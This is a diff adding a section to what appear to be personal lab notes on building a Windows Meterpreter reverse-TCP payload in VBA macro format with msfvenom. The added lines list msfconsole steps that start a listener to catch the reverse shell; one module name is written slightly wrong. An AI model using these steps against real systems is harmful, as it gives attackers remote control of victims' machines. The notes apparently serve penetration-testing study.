@@ -31,3 +31,16 @@ Ultimately the command I came up with was msfvenom -p windows/meterpreter/revers
 - f = format of the output
 - vba = visual basic for applications format
 
+# Setting up the Listener  
+Really simple setup on the kali VM  
+- Ths provides background knowledge on msfconsole commands https://www.offsec.com/metasploit-unleashed/msfconsole-commands/
+
+### In your terminal run each command
+#### msfconsole
+#### use exploit/multihandler
+#### set payload windows/meterpreter/reverse_tcp  
+#### set LHOST our kali IP
+#### set Lport(same port as in the payload)  
+#### run
+
+
